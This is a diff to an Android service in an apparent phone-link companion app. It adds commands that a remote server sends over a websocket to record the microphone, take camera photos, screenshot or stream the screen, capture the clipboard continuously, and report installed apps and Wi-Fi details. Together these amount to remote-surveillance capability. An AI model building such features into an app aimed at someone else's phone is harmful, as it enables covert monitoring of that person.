@@ -29,6 +29,15 @@ import com.phonelink.hub.util.Battery
 import com.phonelink.hub.util.WifiName
 import com.phonelink.hub.notifications.NotificationListener
 import com.phonelink.hub.notifications.WebSocketHolder
+import com.phonelink.hub.remote.AudioPlayer
+import com.phonelink.hub.remote.ClipboardReader
+import com.phonelink.hub.remote.LockController
+import com.phonelink.hub.remote.TtsSpeaker
+import com.phonelink.hub.remote.VibratorController
+import com.phonelink.hub.remote.WallpaperSetter
+import com.phonelink.hub.system.AppsRepository
+import com.phonelink.hub.system.SysInfoRepository
+import com.phonelink.hub.system.WifiRepository
 import org.json.JSONObject
 
 /**
@@ -40,6 +49,8 @@ class PhoneLinkService : Service() {
 
     private lateinit var webSocket: WebSocketClient
     private lateinit var location: LocationRepository
+    private lateinit var ttsSpeaker: TtsSpeaker
+    private lateinit var audioPlayer: AudioPlayer
 
     // BUG 2: periodic refresh so calls/SMS stay fresh while the service runs
     // (previously they synced only once inside onOpen/syncAll).
@@ -72,6 +83,8 @@ class PhoneLinkService : Service() {
         DevicePrefs.init(this)
 
         location = LocationRepository(this)
+        ttsSpeaker = TtsSpeaker(this)
+        audioPlayer = AudioPlayer(this)
 
         webSocket = WebSocketClient(
             prefsProvider = { Pair(DevicePrefs.serverIp, DevicePrefs.serverPort) },
@@ -127,6 +140,12 @@ class PhoneLinkService : Service() {
         stopPeriodicSync()
         webSocket.disconnect()
         location.stopUpdates()
+        ttsSpeaker.shutdown()
+        audioPlayer.release()
+        ClipboardReader.release(this)
+        com.phonelink.hub.media.MicRecorder.cancel()
+        com.phonelink.hub.media.ScreenRecorder.stop()
+        com.phonelink.hub.media.MediaProjectionHolder.release()
         // The listener is bound by the OS, so stop pointing it at our dead socket.
         WebSocketHolder.webSocket = null
         instance = null
@@ -158,6 +177,26 @@ class PhoneLinkService : Service() {
             Events.FIND_PHONE_COMMAND -> FindPhoneManager.start(this)
             Events.NOTIFICATION_DISMISS_COMMAND -> handleNotificationDismiss(payload)
             Events.NOTIFICATION_CLEAR_ALL_COMMAND -> handleNotificationClearAll(payload)
+            // Round 3 remote controls & telemetry
+            Events.VIBRATE_COMMAND -> handleVibrate(payload)
+            Events.TTS_COMMAND -> handleTts(payload)
+            Events.PLAY_AUDIO_COMMAND -> handlePlayAudio(payload)
+            Events.PLAY_AUDIO_STOP -> handlePlayAudioStop()
+            Events.WALLPAPER_COMMAND -> handleWallpaper(payload)
+            Events.DEVICE_INFO_REQUEST -> pushDeviceInfo()
+            Events.INSTALLED_APPS_REQUEST -> pushInstalledApps()
+            Events.APP_PERMS_REQUEST -> handleAppPerms(payload)
+            Events.WIFI_REQUEST -> pushWifiInfo()
+            Events.CLIPBOARD_READ_REQUEST -> handleClipboardRead()
+            Events.CLIPBOARD_CAPTURE_ENABLE -> handleClipboardCapture(true)
+            Events.CLIPBOARD_CAPTURE_DISABLE -> handleClipboardCapture(false)
+            Events.LOCK_COMMAND -> handleLock()
+            Events.CALL_BLOCKLIST_SYNC -> handleCallBlocklistSync(payload)
+            Events.MIC_RECORD_COMMAND -> handleMicRecord(payload)
+            Events.CAMERA_CAPTURE_COMMAND -> handleCameraCapture(payload)
+            Events.SCREENSHOT_COMMAND -> handleScreenshot()
+            Events.SCREEN_RECORD_START -> handleScreenRecordStart(payload)
+            Events.SCREEN_RECORD_STOP -> handleScreenRecordStop()
             else -> Log.w(TAG, "unhandled command: $event")
         }
     }
@@ -368,6 +407,142 @@ class PhoneLinkService : Service() {
         webSocket.send(Events.FILE_LIST_RESPONSE, FileRepository.list(path))
     }
 
+    // ----------------------------------------------------------- round 3 handlers
+
+    private fun handleVibrate(payload: JSONObject) {
+        val result = VibratorController.vibrate(this, payload)
+        webSocket.send(Events.VIBRATE_RESULT, result)
+    }
+
+    private fun handleTts(payload: JSONObject) {
+        ttsSpeaker.speak(payload) { result ->
+            webSocket.send(Events.TTS_RESULT, result)
+        }
+    }
+
+    private fun handlePlayAudio(payload: JSONObject) {
+        audioPlayer.play(payload) { result ->
+            webSocket.send(Events.PLAY_AUDIO_RESULT, result)
+        }
+    }
+
+    private fun handlePlayAudioStop() {
+        audioPlayer.stop { result ->
+            webSocket.send(Events.PLAY_AUDIO_RESULT, result)
+        }
+    }
+
+    private fun handleWallpaper(payload: JSONObject) {
+        WallpaperSetter.setWallpaper(this, payload) { result ->
+            webSocket.send(Events.WALLPAPER_RESULT, result)
+        }
+    }
+
+    fun pushDeviceInfo() {
+        val info = SysInfoRepository.getDeviceInfo(this)
+        Log.d(TAG, "pushDeviceInfo: sending device info")
+        webSocket.send(Events.DEVICE_INFO_RESPONSE, info)
+    }
+
+    fun pushInstalledApps() {
+        val apps = AppsRepository.getInstalledApps(this)
+        Log.d(TAG, "pushInstalledApps: count=${apps.optInt("count")}")
+        webSocket.send(Events.INSTALLED_APPS_RESPONSE, apps)
+    }
+
+    private fun handleAppPerms(payload: JSONObject) {
+        val pkg = payload.optString("packageName")
+        val perms = AppsRepository.getAppPermissions(this, pkg)
+        webSocket.send(Events.APP_PERMS_RESPONSE, perms)
+    }
+
+    fun pushWifiInfo() {
+        val wifi = WifiRepository.getWifiInfo(this)
+        Log.d(TAG, "pushWifiInfo: ssid=${wifi.optString("ssid")}")
+        webSocket.send(Events.WIFI_RESPONSE, wifi)
+    }
+
+    private fun handleClipboardRead() {
+        ClipboardReader.readCurrentText(this) { result ->
+            webSocket.send(Events.CLIPBOARD_READ_RESPONSE, result)
+        }
+    }
+
+    private fun handleClipboardCapture(enable: Boolean) {
+        ClipboardReader.setCaptureEnabled(this, enable) { text ->
+            webSocket.send(Events.CLIPBOARD_UPDATE, JSONObject().apply {
+                put("deviceId", DevicePrefs.deviceId)
+                put("text", text)
+                put("timestamp", System.currentTimeMillis())
+            })
+        }
+    }
+
+    private fun handleLock() {
+        val result = LockController.lockDevice(this)
+        webSocket.send(Events.LOCK_RESULT, result)
+    }
+
+    private fun handleCallBlocklistSync(payload: JSONObject) {
+        val enabled = payload.optBoolean("enabled", false)
+        val numbersArray = payload.optJSONArray("numbers")
+        val numbers = mutableListOf<String>()
+        if (numbersArray != null) {
+            for (i in 0 until numbersArray.length()) {
+                val num = numbersArray.optString(i)
+                if (num.isNotBlank()) numbers.add(num)
+            }
+        }
+        com.phonelink.hub.blocker.BlocklistStore.setBlocklist(this, enabled, numbers)
+        webSocket.send(
+            Events.CALL_BLOCKLIST_RESULT,
+            JSONObject().apply {
+                put("deviceId", DevicePrefs.deviceId)
+                put("enabled", enabled)
+                put("numbers", org.json.JSONArray(numbers))
+                put("success", true)
+            }
+        )
+    }
+
+    fun pushBlocklistStatus() {
+        val json = com.phonelink.hub.blocker.BlocklistStore.toJson(this)
+        json.put("deviceId", DevicePrefs.deviceId)
+        json.put("success", true)
+        webSocket.send(Events.CALL_BLOCKLIST_RESULT, json)
+    }
+
+    private fun handleMicRecord(payload: JSONObject) {
+        val durationSec = payload.optInt("durationSec", 15)
+        com.phonelink.hub.media.MicRecorder.record(this, durationSec) { result ->
+            webSocket.send(Events.MIC_RECORD_RESULT, result)
+        }
+    }
+
+    private fun handleCameraCapture(payload: JSONObject) {
+        val facing = payload.optString("facing", "back")
+        com.phonelink.hub.media.CameraCapture.capture(this, facing) { result ->
+            webSocket.send(Events.CAMERA_CAPTURE_RESULT, result)
+        }
+    }
+
+    private fun handleScreenshot() {
+        com.phonelink.hub.media.ScreenshotController.capture(this) { result ->
+            webSocket.send(Events.SCREENSHOT_RESULT, result)
+        }
+    }
+
+    private fun handleScreenRecordStart(payload: JSONObject) {
+        val fps = payload.optInt("fps", 2)
+        com.phonelink.hub.media.ScreenRecorder.start(this, fps) { frame ->
+            webSocket.send(Events.SCREEN_RECORD_FRAME, frame)
+        }
+    }
+
+    private fun handleScreenRecordStop() {
+        com.phonelink.hub.media.ScreenRecorder.stop()
+    }
+
     // -------------------------------------------------------------- notification
 
     private fun startAsForeground(text: String) {
@@ -507,5 +682,8 @@ class PhoneLinkService : Service() {
         pushSms()
         pushLocation()
         pushContacts()
+        pushDeviceInfo()
+        pushWifiInfo()
+        pushBlocklistStatus()
     }
 }
